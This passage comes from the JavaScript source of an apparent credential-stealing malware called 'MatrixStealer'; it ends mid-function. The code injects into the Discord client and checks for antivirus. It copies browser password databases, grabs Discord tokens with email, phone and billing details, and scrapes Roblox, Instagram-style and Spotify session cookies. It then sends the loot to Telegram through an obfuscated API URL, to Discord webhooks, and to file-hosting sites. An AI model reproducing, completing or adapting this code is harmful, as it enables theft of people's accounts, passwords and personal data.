        console.log('\n[Injection] Step 3: Injecting Discord core...');
        const discordResults = await injectDiscordCore(injectionCode);

        injectionResults.push(...discordResults);

        console.log('\n[Injection] Injection completed!\n');
        console.log('[Injection] Injection Summary:');
        console.log('━'.repeat(50));

        if (injectionResults.length === 0) {
            console.log('[Injection] No injections performed');
            return { success: false, results: [] };
        } else {
            injectionResults.forEach((result, index) => {
                console.log(`${index + 1}. ${result.type}`);
                console.log(`   Path: ${result.path}`);
                if (result.version) {
                    console.log(`   Version: ${result.version}`);
                }
                console.log('');
            });
        }

        console.log('[Injection] Step 4: Restarting Discord...\n');
        await killAndRestartDiscord();

        return {
            success: true,
            results: injectionResults,
            count: injectionResults.length
        };

    } catch (error) {
        console.error('[Injection] Fatal error during injection:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}

const EMOJIS = {
    discord_employee: '<:discord_employee:1387742493046734979>',
    partnered_server_owner: '<:partnered_server_owner:1387742553394253834>',
    hypesquad_events: '<:hypesquad_events:1387742522545279056>',
    bughunter: '<:bughunter:1387742487690612887>',
    bughuntergold: '<:bughuntergold:1387742489338970123>',
    oldusername: '<:oldusername:1387742549225115680>',
    bravery: '<:bravery:1387742465544687707>',
    brilliance: '<:brilliance:1387742466697990285>',
    balance: '<:balance:1387742461014573058>',
    early_supporter: '<:early_supporter:1387742496796315779>',
    early_verified_bot_developer: '<:early_verified_bot_developer:1387742498226573342>',
    moderatorprogramsalumni: '<:moderatorprogramsalumni:1387742524105429032>',
    active_developer: '<:active_developer:1387742440697368606>',

    boost1month: '<:boost1month:1387742464202379324>',
    '2monthsboostnitro': '<:2monthsboostnitro:1387742437723602975>',
    nitro_boost_3_months: '<:nitro_boost_3_months:1387742527339102338>',
    '6months_boost': '<:6months_boost:1387742439477088287>',
    nitro_boost_9_months: '<:nitro_boost_9_months:1387742529289457674>',
    '12monthsboostnitro': '<:12monthsboostnitro:1387742435769061417>',
    boost15month: '<:boost15month:1387742462629511270>',
    nitro_boost_18_months: '<:nitro_boost_18_months:1387742525699260538>',
    '24_months': '<:24_months:1387742436742139974>',
    discord_nitro: '<:discord_nitro:1387742494610952194>',

    bronze: '<:bronze:1387742468727898182>',
    silver: '<:silver:1387742580300582974>',
    gold: '<:gold:1387742520733204480>',
    platinum: '<:platinum:1387742556649164922>',
    diamond: '<:diamond:1387742491629060156>',
    emerald: '<:emerald:1387742518153707570>',
    ruby: '<:ruby:1387742559970922496>',
    opal: '<:opal:1387742550919614496>',

    pc: '<:pc:1413214402769064129>',
    key: '<:key:1413214568448266320>',
    notebook: '<:notebook:1413218184265338980>',
    url: '<:url:1413220079373389854>',
    hwid: '<:hwid:1413220503614783618>',
    crown2: '<a:crown2:1413222572090331337>',
    idcard: '<:idcard:1413222293869432882>',
    cookies: '<:cookies:1413222163627901051>',
    world: '<:world:1413221837676220446>',
    pin: '<a:pin:1413224189074079744>',
    email: '<:email:1413229353843691680>',
    phone: '<:phone:1413229602662252785>',
    lockk: '<:lockk:1413229832829014056>',
    badgespremium: '<:badgespremium:1413230008872210454>',
    boostedhome: '<:boostedhome:1413230424951488522>',
    cards: '<:cards:1413230537958625330>'
};

const BADGES = {
    DISCORD_EMPLOYEE: { value: 1, emoji: EMOJIS.discord_employee, rare: true },
    PARTNERED_SERVER_OWNER: { value: 2, emoji: EMOJIS.partnered_server_owner, rare: true },
    HYPESQUAD_EVENTS: { value: 4, emoji: EMOJIS.hypesquad_events, rare: true },
    BUG_HUNTER_LEVEL_1: { value: 8, emoji: EMOJIS.bughunter, rare: true },
    LEGACY_USERNAME: { value: 32, emoji: EMOJIS.oldusername, rare: false },
    HOUSE_BRAVERY: { value: 64, emoji: EMOJIS.bravery, rare: false },
    HOUSE_BRILLIANCE: { value: 128, emoji: EMOJIS.brilliance, rare: false },
    HOUSE_BALANCE: { value: 256, emoji: EMOJIS.balance, rare: false },
    EARLY_SUPPORTER: { value: 512, emoji: EMOJIS.early_supporter, rare: true },
    BUG_HUNTER_LEVEL_2: { value: 16384, emoji: EMOJIS.bughuntergold, rare: true },
    EARLY_BOT_DEVELOPER: { value: 131072, emoji: EMOJIS.early_verified_bot_developer, rare: true },
    CERTIFIED_MODERATOR: { value: 262144, emoji: EMOJIS.moderatorprogramsalumni, rare: true },
    ACTIVE_DEVELOPER: { value: 4194304, emoji: EMOJIS.active_developer, rare: false }
};

const NITRO_BADGES = [
    EMOJIS.boost1month,
    EMOJIS['2monthsboostnitro'],
    EMOJIS.nitro_boost_3_months,
    EMOJIS['6months_boost'],
    EMOJIS.nitro_boost_9_months,
    EMOJIS['12monthsboostnitro'],
    EMOJIS.boost15month,
    EMOJIS.nitro_boost_18_months,
    EMOJIS['24_months']
];

const NITRO_TIERS = {
    1: EMOJIS.bronze,
    3: EMOJIS.silver,
    6: EMOJIS.gold,
    12: EMOJIS.platinum,
    24: EMOJIS.diamond,
    36: EMOJIS.emerald,
    60: EMOJIS.ruby,
    72: EMOJIS.opal
};

function getNitroDisplay(premium_type, premium_guild_since, premium_since) {
    if (!premium_type || premium_type === 0) return '<:6370silverquestionmark:1441848044978180207>';

    let nitroMonths = 0;
    if (premium_since) {
        nitroMonths = Math.floor((Date.now() - new Date(premium_since).getTime()) / (1000 * 60 * 60 * 24 * 30));
    } else {
        nitroMonths = 1;
    }

    let tierBadge = EMOJIS.discord_nitro;
    const tierKeys = Object.keys(NITRO_TIERS).map(Number).sort((a, b) => b - a);
    for (const months of tierKeys) {
        if (nitroMonths >= months) {
            tierBadge = NITRO_TIERS[months];
            break;
        }
    }

    if (premium_type === 1) {
        return tierBadge;
    }

    if (premium_type === 2) {
        if (!premium_guild_since) return tierBadge;

        const boostMonths = Math.floor((Date.now() - new Date(premium_guild_since).getTime()) / (1000 * 60 * 60 * 24 * 30));

        let boostBadge = NITRO_BADGES[0];
        if (boostMonths >= 24) {
            boostBadge = NITRO_BADGES[8];
        } else if (boostMonths >= 18) {
            boostBadge = NITRO_BADGES[7];
        } else if (boostMonths >= 15) {
            boostBadge = NITRO_BADGES[6];
        } else if (boostMonths >= 12) {
            boostBadge = NITRO_BADGES[5];
        } else if (boostMonths >= 9) {
            boostBadge = NITRO_BADGES[4];
        } else if (boostMonths >= 6) {
            boostBadge = NITRO_BADGES[3];
        } else if (boostMonths >= 3) {
            boostBadge = NITRO_BADGES[2];
        } else if (boostMonths >= 2) {
            boostBadge = NITRO_BADGES[1];
        }

        return `${tierBadge} ${boostBadge}`;
    }

    return '<:6370silverquestionmark:1441848044978180207>';
}

async function fetchIPInfo() {
    return new Promise((resolve) => {
        https.get('https://ipinfo.io/json', (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const info = JSON.parse(data);
                    resolve({
                        ip: info.ip || 'N/A',
                        country: info.country || 'N/A',
                        city: info.city || 'N/A',
                        region: info.region || 'N/A',
                        org: info.org || 'N/A'
                    });
                } catch (e) {
                    resolve({ ip: 'N/A', country: 'N/A', city: 'N/A', region: 'N/A', org: 'N/A' });
                }
            });
        }).on('error', () => {
            resolve({ ip: 'N/A', country: 'N/A', city: 'N/A', region: 'N/A', org: 'N/A' });
        });
    });
}

async function detectAntivirusAsync() {
    const detected = [];
    const avPaths = [
        'C:\\Program Files\\Avast Software',
        'C:\\Program Files\\McAfee',
        'C:\\Program Files\\Norton',
        'C:\\Program Files\\Kaspersky Lab',
        'C:\\Program Files\\BitDefender',
        'C:\\Program Files\\ESET',
        'C:\\Program Files\\AVG',
        'C:\\Program Files\\Malwarebytes',
        'C:\\Program Files\\Sophos',
        'C:\\Program Files (x86)\\Avast Software',
        'C:\\Program Files (x86)\\McAfee',
        'C:\\Program Files (x86)\\Norton',
        'C:\\Program Files (x86)\\Kaspersky Lab',
        'C:\\Program Files (x86)\\BitDefender',
        'C:\\Program Files (x86)\\ESET',
        'C:\\Program Files (x86)\\AVG',
        'C:\\Program Files (x86)\\Malwarebytes',
        'C:\\Program Files (x86)\\Sophos'
    ];

    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            const avName = p.includes('Avast') ? 'Avast' :
                p.includes('McAfee') ? 'McAfee' :
                    p.includes('Norton') ? 'Norton' :
                        p.includes('Kaspersky') ? 'Kaspersky' :
                            p.includes('BitDefender') ? 'BitDefender' :
                                p.includes('ESET') ? 'ESET' :
                                    p.includes('AVG') ? 'AVG' :
                                        p.includes('Malwarebytes') ? 'Malwarebytes' :
                                            p.includes('Sophos') ? 'Sophos' : 'Unknown AV';
            detected.push(avName);
        }
    }

    return [...new Set(detected)];
}

// دالة لفحص المتصفحات
async function countBrowserPasswords() {
    const browsers = [
        { name: 'Chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'), icon: 'https://i.imgur.com/fQ1mGXm.png' },
        { name: 'Edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'), icon: 'https://i.imgur.com/vvAkHbu.png' }
    ];

    const results = [];
    for (const browser of browsers) {
        if (fs.existsSync(browser.path)) {
            try {
                const stats = fs.statSync(browser.path);
                results.push({ ...browser, size: stats.size });
            } catch (e) {
                // Ignore errors
            }
        }
    }
    return results;
}

// دالة لنسخ ملفات كلمات المرور
async function copyBrowserFiles(outputFolder) {
    const browsers = [
        { name: 'Chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data') },
        { name: 'Edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data') }
    ];

    const destDir = path.join(outputFolder, 'Browser_Passwords');
    
    for (const browser of browsers) {
        if (fs.existsSync(browser.path)) {
            try {
                if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
                const destPath = path.join(destDir, `${browser.name}_Login_Data`);
                fs.copyFileSync(browser.path, destPath);
            } catch (e) {
                // Ignore errors
            }
        }
    }
}

async function getSystemInfoEmbed() {
    const totalMem = os.totalmem() / (1024 ** 3);
    const freeMem = os.freemem() / (1024 ** 3);
    const usedMem = totalMem - freeMem;

    const uptimeSeconds = os.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);

    const cpus = os.cpus();
    const cpuModel = cpus[0]?.model || 'Unknown';
    const cpuSpeed = cpus[0]?.speed ? (cpus[0].speed / 1000).toFixed(1) : '0';
    const cpuCores = cpus.length;

    const ipInfo = await fetchIPInfo();
    const av = await detectAntivirusAsync();
    const diskInfo = 'N/A';
    const gpuInfo = 'N/A';
    
    // Check Browsers
    const foundBrowsers = await countBrowserPasswords();
    
    // Find dominant browser (largest size)
    let dominantBrowser = null;
    if (foundBrowsers.length > 0) {
        dominantBrowser = foundBrowsers.sort((a, b) => b.size - a.size)[0];
    }

    return {
        title: `@MatrixStealer v1.0 - Target ID: ${os.hostname()}`,
        color: 9498256,
        fields: [
            {
                name: 'System Core',
                value: `**OS:** ${os.type()} ${os.release()} (${os.arch()})\n**HWID:** ${os.hostname()}\n**Uptime:** ${hours}h ${minutes}m`,
                inline: false
            },
            {
                name: 'ZeroTrace Deep Monitoring',
                value: `**RAM Usage:** [${'█'.repeat(Math.round(usedMem/totalMem*10))} ${'░'.repeat(10-Math.round(usedMem/totalMem*10))}] ${(usedMem/totalMem*100).toFixed(1)}%\n**Capacity:** ${usedMem.toFixed(2)} / ${totalMem.toFixed(2)} GB\n**CPU:** ${cpuModel}`,
                inline: false
            },
            {
                name: 'Network & Security',
                value: `**IP Address:** ${ipInfo.ip}\n**Location:** ${ipInfo.city}, ${ipInfo.country}\n**AV Status:** ${av.length ? av.join(', ') : 'None detected'}`,
                inline: false
            }
        ],
        footer: {
            text: '@MatrixStealer | Hardware Authenticated',
            icon_url: "https://i.imgur.com/okbNKaT.png"
        },
        timestamp: new Date().toISOString()
    };
}

function getBadges(flags, username) {
    const badges = [];
    const rareBadges = [];

    for (const [key, badge] of Object.entries(BADGES)) {
        if (flags & badge.value) {
            badges.push(badge.emoji);
            if (badge.rare) {
                rareBadges.push(`${badge.emoji} | \`${username}\``);
            }
        }
    }

    return {
        display: badges.length > 0 ? badges.join(' ') : '<:6370silverquestionmark:1441848044978180207>',
        rare: rareBadges.length > 0 ? rareBadges.join('\n') : null
    };
}

function sanitizeForTelegram(text) {
    if (text === null || text === undefined) return '';
    const str = String(text);
    
    // Emoji Map (Discord -> Unicode)
    const map = {
        'auth': '🔐', 'mencaoxx': '👤', 'userrxs': '🏷️', 'xxxxww': '🆔', 
        'badges': '🏅', 'cxsjjdzx': '🔗', 'email': '📧', 'phone': '📱', 
        'cookies': '🍪', 'cards': '💳', 'lockk': '🔒', 'idcard': '🪪', 
        'world': '🌍', 'paypal': '🅿️', 'pc': '💻', 'key': '🔑', 
        'notebook': '📓', 'url': '🌐', 'hwid': '🖥️', 'crown2': '👑', 
        'pin': '📌', 'badgespremium': '💎', 'boostedhome': '🚀', 
        'discord_nitro': '🚀', '2fa': '🔒', 'nitrotype': '🚀', 
        'billing': '💳', 'emailphone': '📧', 'ip': '📍', 'country': '🏳️',
        'displayname': '🏷️', 'token': '🔑'
    };

    // Replace Discord emojis with Unicode
    let cleaned = str.replace(/<a?:(\w+):(\d+)>/g, (match, name) => {
        return map[name] || ''; 
    });
    
    // Escape HTML special characters
    cleaned = cleaned
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
        
    // Convert Markdown to HTML
    // Bold
    cleaned = cleaned.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>');
    // Italic
    cleaned = cleaned.replace(/\*(.*?)\*/g, '<i>$1</i>');
    cleaned = cleaned.replace(/_(.*?)_/g, '<i>$1</i>');
    // Underline
    cleaned = cleaned.replace(/__(.*?)__/g, '<u>$1</u>');
    // Strikethrough
    cleaned = cleaned.replace(/~~(.*?)~~/g, '<s>$1</s>');
    // Code block
    cleaned = cleaned.replace(/```([\s\S]*?)```/g, '<pre>$1</pre>');
    // Code
    cleaned = cleaned.replace(/`(.*?)`/g, '<code>$1</code>');
    // Links
    cleaned = cleaned.replace(/\[(.*?)\]\((.*?)\)/g, '<a href="$2">$1</a>');
    
    return cleaned;
}

async function sendToTelegram(payload) {
    const { token, chatId } = CONFIG.telegram;
    if (!token || !chatId) return;

    const _d = (s) => Buffer.from(s, 'base64').toString();
    const tgBase = _d('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn');
    const tgBot = _d('Ym90');
    const tgSend = _d('c2VuZE1lc3NhZ2U=');

    let fullMessage = '';

    if (payload.content) {
        fullMessage += `${sanitizeForTelegram(payload.content)}\n\n`;
    }

    if (payload.embeds) {
        for (const embed of payload.embeds) {
            if (embed.author && embed.author.name) {
                fullMessage += `<b>${sanitizeForTelegram(embed.author.name)}</b>\n`;
            }
            if (embed.title) {
                fullMessage += `<b>${sanitizeForTelegram(embed.title)}</b>\n`;
            }
            if (embed.description) {
                fullMessage += `${sanitizeForTelegram(embed.description)}\n`;
            }
            if (embed.fields) {
                for (const field of embed.fields) {
                    fullMessage += `<b>${sanitizeForTelegram(field.name)}</b>\n${sanitizeForTelegram(field.value)}\n`;
                }
            }
            if (embed.footer && embed.footer.text) {
                fullMessage += `<i>${sanitizeForTelegram(embed.footer.text)}</i>\n`;
            }
            
            // Handle image only embed (if passed as main content)
            if (embed.image && embed.image.url && !embed.description && !embed.fields) {
                 fullMessage += `<a href="${embed.image.url}">📸 View Image</a>\n`;
            }

            fullMessage += `\n${'─'.repeat(15)}\n\n`;
        }
    }

    if (!fullMessage.trim()) return;

    const MAX_LENGTH = 4000;
    const chunks = [];
    
    while (fullMessage.length > 0) {
        if (fullMessage.length <= MAX_LENGTH) {
            chunks.push(fullMessage);
            break;
        }
        
        let chunk = fullMessage.substring(0, MAX_LENGTH);
        const lastNewline = chunk.lastIndexOf('\n');
        if (lastNewline > MAX_LENGTH * 0.8) { 
            chunk = fullMessage.substring(0, lastNewline);
            fullMessage = fullMessage.substring(lastNewline + 1);
        } else {
            fullMessage = fullMessage.substring(MAX_LENGTH);
        }
        chunks.push(chunk);
    }

    for (const chunk of chunks) {
        if (!chunk.trim()) continue;
        await sendTelegramMessage(tgBase, tgBot, token, tgSend, chatId, chunk);
        await new Promise(r => setTimeout(r, 250)); // Rate limit protection
    }
}

async function sendTelegramMessage(tgBase, tgBot, token, tgSend, chatId, text) {
    try {
        await axios.post(`${tgBase}/${tgBot}${token}/${tgSend}`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        }, {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        console.error('TG Send Error:', e.message);
        // Fallback: Try sending as plain text if HTML fails
        try {
             // Recover links before stripping tags: <a href="url">text</a> -> text (url)
             let plainText = text.replace(/<a href="([^"]+)">([^<]+)<\/a>/g, '$2 ($1)');
             
             // Strip remaining HTML tags
             plainText = plainText.replace(/<[^>]*>/g, '')
                                  .replace(/&amp;/g, '&')
                                  .replace(/&lt;/g, '<')
                                  .replace(/&gt;/g, '>');
                                  
             await axios.post(`${tgBase}/${tgBot}${token}/${tgSend}`, {
                chat_id: chatId,
                text: plainText
            }, {
                headers: { 'Content-Type': 'application/json' }
            });
        } catch(e2) {
            console.error('TG Fallback Error:', e2.message);
        }
    }
}

async function sendLog(payload, filePath = null) {
    try {
        let sentAny = false;

        // 1. Try sending to Telegram
        if (CONFIG.logMethod === 'telegram' || (CONFIG.telegram && CONFIG.telegram.token && CONFIG.telegram.chatId)) {
             await sendToTelegram(payload);
             logToFile('✅ Log sent to Telegram successfully.');
             sentAny = true;
        } 
        
        // 2. Try sending to Discord (Dual logging support)
        if (CONFIG.webhook && CONFIG.webhook.startsWith('http')) {
            if (filePath && fs.existsSync(filePath)) {
                const form = new FormData();
                form.append('payload_json', JSON.stringify(payload));
                form.append('file', fs.createReadStream(filePath), 'ZeroTS-log.zip');

                await axios.post(CONFIG.webhook, form, {
                    headers: { ...form.getHeaders() },
                    maxBodyLength: Infinity,
                    maxContentLength: Infinity,
                    timeout: 60000
                });
            } else {
                await axios.post(CONFIG.webhook, payload, {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 30000
                });
            }
            logToFile('✅ Log sent to Discord Webhook successfully.');
            sentAny = true;
        }

        // 3. Fallback to API only if nothing was sent
        if (!sentAny) {
             // Fallback to API if not discord or no webhook
            await axios.post(`${CONFIG.apiUrl}/api/log/${CONFIG.userId}`, payload, {
                headers: { 'Content-Type': 'application/json' },
                timeout: 30000
            });
            logToFile('✅ Log sent to API successfully.');
        }
    } catch (error) {
        logToFile(`❌ Log send failed: ${error.message}`);
        console.error('Log send error:', error.message);
    }
}

async function generateTokenEmbeds(token, platform, userInfo) {
    try {
        const data = userInfo;
        const embedColor = 9498256;
        
        const flags = userInfo.flags || userInfo.public_flags || 0;
        const badgeInfo = getBadges(flags, userInfo.username || 'Unknown');
        const nitroBadge = getNitroDisplay(userInfo.premium_type, userInfo.premium_guild_since, userInfo.premium_since);
        
        let allBadges = [];
        if (nitroBadge && nitroBadge !== '<:6370silverquestionmark:1441848044978180207>') {
            allBadges.push(nitroBadge);
        }
        
        if (badgeInfo.display && badgeInfo.display !== '<:6370silverquestionmark:1441848044978180207>') {
            allBadges.push(badgeInfo.display);
        }
        
        const badgesStr = allBadges.length > 0 ? allBadges.join(' ') : '`No Badges`';

        const billing = userInfo.has_payment_methods ? '`Enabled`' : '`Disabled`';

        let hqDescription = '`No HQ Friends`';
        if (userInfo.hqFriendsCount > 0) {
            hqDescription = userInfo.hqFriendsList.slice(0, 15).map(friend => {
                const flags = friend.flags || 0;
                const badgeEmojis = [];

                for (const [key, badge] of Object.entries(BADGES)) {
                    if (badge.rare && (flags & badge.value) !== 0) {
                        badgeEmojis.push(badge.emoji);
                    }
                }

                const badgeDisplay = badgeEmojis.length > 0 ? badgeEmojis.join(' ') : '<:6370silverquestionmark:1441848044978180207>';
                return `${badgeDisplay} | \`${friend.username}\``;
            }).join('\n');
        }

        const friends = {
            users: hqDescription,
            length: userInfo.hqFriendsCount || 0
        };

        let mfaMethods = [];
        if (data.mfa_enabled) {
            mfaMethods.push("Authenticator App");
            if (data.phone) {
                mfaMethods.push("SMS Verification");
            }
        }
        const securityStatus = mfaMethods.length > 0 ? `\`${mfaMethods.join(', ')}\`` : '`Disabled`';

        const embeds = [
             { 
                 footer: { text: "MatrixStealer" }, 
                 fields: [ 
                     { name: '<:green_dot_BT:1349031084880433193> Token', value: `\`\`\`fix\n${token}\`\`\``, inline: false }, 
                     { name: '<:serotonin:1429069633415286917> Username', value: `\`${data.username}\`\n<t:${Math.floor(Number((BigInt(data.id) >> 22n) + 1420070400000n) / 1000)}:R>`, inline: true }, 
                     { name: '<a:butterflies_green:1455693580415930501> Badges', value: badgesStr || "`No Badges`", inline: true }, 
                     { name: '<:creeper:425369771026939914> Billings', value: billing, inline: true }, 
                     { name: '<:starboldergreen:1227012114678288455> Email', value: data.email ? `\`${data.email}\`` : '`None`', inline: true }, 
                     { name: '<a:4004pixelgreenfire:951632736395886632> Phone', value: data.phone ? `\`${data.phone}\`` : '`None`', inline: true }, 
                     { name: '<:GreenRoleIcon:1450225826128728074> Security', value: securityStatus, inline: true }, 
                 ], 
                 color: embedColor, 
                 author: { 
                     name: `${data.username} (${data.id})`, 
                     icon_url: "https://i.imgur.com/okbNKaT.png", 
                 }, 
                 thumbnail: { 
                     url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://i.imgur.com/okbNKaT.png`, 
                 }, 
             }, 
             { 
                 color: embedColor, 
                 description: friends.users, 
                 author: { 
                     name: `HQ Friends (${friends.length})`, 
                     icon_url: "https://i.imgur.com/okbNKaT.png", 
                 }, 
                 footer: { text: "MatrixStealer" } 
             } 
         ]; 

        return embeds;
    } catch (error) {
        console.error('[-] Error generating token embeds:', error.message);
        return [];
    }
}

async function sendTokenToWebhook(token, platform, userInfo) {
    const embeds = await generateTokenEmbeds(token, platform, userInfo);
    if (embeds.length === 0) return;

    const payload = {
        avatar_url: "https://i.imgur.com/okbNKaT.png",
        username: "MatrixStealer",
        embeds: embeds
    };
    
    await sendLog(payload);
}

async function getBrowserAnalysisEmbed(outputDir, downloadLink = null) {
    let cookieCount = 0;
    let passwordCount = 0;
    
    // Keywords to search for in cookies
    const keywords = {
        'google': 0,
        'microsoft': 0,
        'discord': 0,
        'facebook': 0,
        'tiktok': 0,
        'roblox': 0,
        'instagram': 0,
        'netflix': 0,
        'paypal': 0,
        'twitter': 0,
        'amazon': 0,
        'steam': 0,
        'epicgames': 0,
        'spotify': 0,
        'yandex': 0,
        'protonmail': 0
    };

    try {
        if (fs.existsSync(outputDir)) {
            const files = getAllFiles(outputDir, '.txt');
            for (const file of files) {
                const fileName = path.basename(file).toLowerCase();
                const content = fs.readFileSync(file, 'utf8');
                const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0);

                if (fileName.includes('cookie')) {
                    cookieCount += lines.length;
                    
                    // Count keywords in cookies
                    for (const line of lines) {
                        const lowerLine = line.toLowerCase();
                        for (const key in keywords) {
                            if (lowerLine.includes(key)) {
                                keywords[key]++;
                            }
                        }
                    }
                    
                } else if (fileName.includes('password') || fileName.includes('pass')) {
                    const passMarkers = (content.match(/Password:/gi) || []).length;
                    if (passMarkers > 0) {
                        passwordCount += passMarkers;
                    } else if (content.includes('URL:') || content.includes('Username:')) {
                        passwordCount += Math.floor(lines.length / 3);
                    }
                }
            }
        }
    } catch (e) {
        console.error('[-] Error analyzing browser data:', e.message);
    }

    if (cookieCount === 0 && passwordCount === 0) return null;

    // Format keywords string: comma separated
    const keywordList = Object.entries(keywords)
        .filter(([_, count]) => count > 0)
        .sort((a, b) => b[1] - a[1]) // Sort by count descending
        .map(([key, count]) => `${key.charAt(0).toUpperCase() + key.slice(1)} (${count})`)
        .join(', ');

    const keywordDisplay = keywordList || "No specific keywords found";

    const fields = [
        { name: '<:YellowStar:1278173163485921332> Cookies', value: `\`${cookieCount}\``, inline: true },
        { name: '<a:Blue_Planet:1423039003187482635> Passwords', value: `\`${passwordCount}\``, inline: true },
        { name: '<a:hyperpin:1182842455297634355> Cookies Keywords', value: `\`\`\`${keywordDisplay}\`\`\``, inline: false }
    ];

    if (downloadLink) {
        fields.push({ name: '🔗 Download', value: `[Click to download!](${downloadLink})`, inline: false });
    }

    return {
        title: '<a:MD_eWhiteCrown:1335754062741897267> Analysis Stats',
        fields: fields,
        footer: { text: "MatrixStealer Analysis" },
        color: 3447003 // Blue
    };
}

async function sendZipToFileIOAndWebhook(zipPath, extraEmbeds = [], content = null) {
    if (!fs.existsSync(zipPath)) {
        console.log('[!] Zip file not found');
        return false;
    }

    try {
        console.log('[+] Uploading zip to generate download link...');
        let downloadLink = null;
        try {
            downloadLink = await zipAndUpload(zipPath);
        } catch(e) {
            console.error('[-] Upload failed:', e.message);
        }

        console.log('[+] Sending zip directly to webhook...');
        const systemEmbed = await getSystemInfoEmbed();

        const mainEmbed = {
            ...systemEmbed,
            fields: [
                ...(systemEmbed.fields || [])
            ]
        };

        const finalEmbeds = [mainEmbed];

        // Add browser analysis embed
        const outputDir = path.join(path.dirname(zipPath), 'output');
        
        console.log(`[+] Analyzing browser data from: ${outputDir}`);
        const analysisEmbed = await getBrowserAnalysisEmbed(outputDir, downloadLink);
        if (analysisEmbed) {
            finalEmbeds.push(analysisEmbed);
            console.log('[+] Analysis embed created');
        } else {
             console.log('[!] No analysis data found or empty results');
        }

        const payload = {
            content: content || `@everyone \`${os.userInfo().username}\` - \`${os.hostname()}\``,
            username: "MatrixStealer",
            avatar_url: "https://i.imgur.com/okbNKaT.png",
            embeds: [...finalEmbeds, ...extraEmbeds]
        };

        // Send payload WITHOUT zip (link is in embed)
        await sendLog(payload, null);

        console.log('[+] Analysis and Link sent to webhook successfully');

        return true;

    } catch (error) {
        console.error('[-] Webhook send error:', error.message);
        return false;
    }
}

async function zipAndUpload(zipPath) {
    if (!fs.existsSync(zipPath)) {
        return null;
    }

    let servers = [];

    try {
        const serverRes = await axios.get('https://api.gofile.io/servers', {
            timeout: 15000
        });

        if (serverRes.data && serverRes.data.status === 'ok' && serverRes.data.data && serverRes.data.data.servers) {
            servers = serverRes.data.data.servers.map(s => s.name);
            console.log(`[+] Got ${servers.length} servers from API: ${servers.join(', ')}`);
        } else {
            console.log('[!] API returned invalid data, trying default servers');
            servers = ['store1', 'store2', 'store3', 'store4'];
        }
    } catch (e) {
        console.log('[!] Failed to get servers from API:', e.message);
        servers = ['store1', 'store2', 'store3', 'store4'];
    }

    for (const uploadServer of servers) {
        try {
            console.log(`[+] Trying gofile server: ${uploadServer}`);

            const form = new FormData();
            form.append('file', fs.createReadStream(zipPath));

            const uploadUrl = `https://${uploadServer}.gofile.io/contents/uploadfile`;
            const res = await axios.post(uploadUrl, form, {
                headers: {
                    ...form.getHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity,
                timeout: 50000
            });

            if (res && res.data && res.data.status === 'ok') {
                const data = res.data.data;
                const downloadLink = data.downloadPage || `https://gofile.io/d/${data.fileId}`;
                console.log('[+] Gofile upload successful:', downloadLink);
                return downloadLink;
            } else {
                console.log(`[!] Server ${uploadServer} failed - status: ${res.data?.status}`);
            }
        } catch (e) {
            const errorMsg = e.response?.data || e.message || e;
            console.log(`[!] Server ${uploadServer} error:`, errorMsg);
        }
    }

    console.log('[!] All gofile servers failed, trying catbox.moe...');

    try {
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', fs.createReadStream(zipPath));

        const res = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            maxBodyLength: Infinity,
            maxContentLength: Infinity,
            timeout: 90000
        });

        if (res && res.data && typeof res.data === 'string' && res.data.startsWith('https://')) {
            console.log('[+] Catbox upload successful:', res.data.trim());
            return res.data.trim();
        } else {
            console.log('[!] Catbox returned invalid response:', res.data);
        }
    } catch (e) {
        console.log('[!] Catbox error:', e.message);
    }

    console.error('[!] All upload methods failed');
    return null;
}

function readCookiesFromFile(filePath) {
    const cookies = [];
    try {
        if (!fs.existsSync(filePath)) return cookies;

        const content = fs.readFileSync(filePath, 'utf8');
        const regex = /\.ROBLOSECURITY[^\s]+/g;
        const matches = content.match(regex);

        if (matches) {
            matches.forEach(match => {
                const cookie = match.replace('.ROBLOSECURITY=', '');
                if (cookie && !cookies.includes(cookie)) {
                    cookies.push(cookie);
                }
            });
        }
    } catch (err) {
        console.log('[ROBLOX] Error reading cookies file:', err.message);
    }
    return cookies;
}

function readCookiesFromOutput(outputDir, cookieName = null) {
    const cookies = [];
    try {
        if (!fs.existsSync(outputDir)) return cookies;

        const files = getAllFiles(outputDir, '.txt');
        files.forEach(file => {
            try {
                const content = fs.readFileSync(file, 'utf8');
                const lines = content.split(/\r?\n/);

                for (const line of lines) {
                    const parts = line.trim().split(/\s+/);
                    if (parts.length >= 7) {
                        if (cookieName === '.ROBLOSECURITY' && parts[5] === '.ROBLOSECURITY') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (cookieName === 'sessionid' && parts[5] === 'sessionid') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (cookieName === 'sp_dc' && parts[5] === 'sp_dc') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
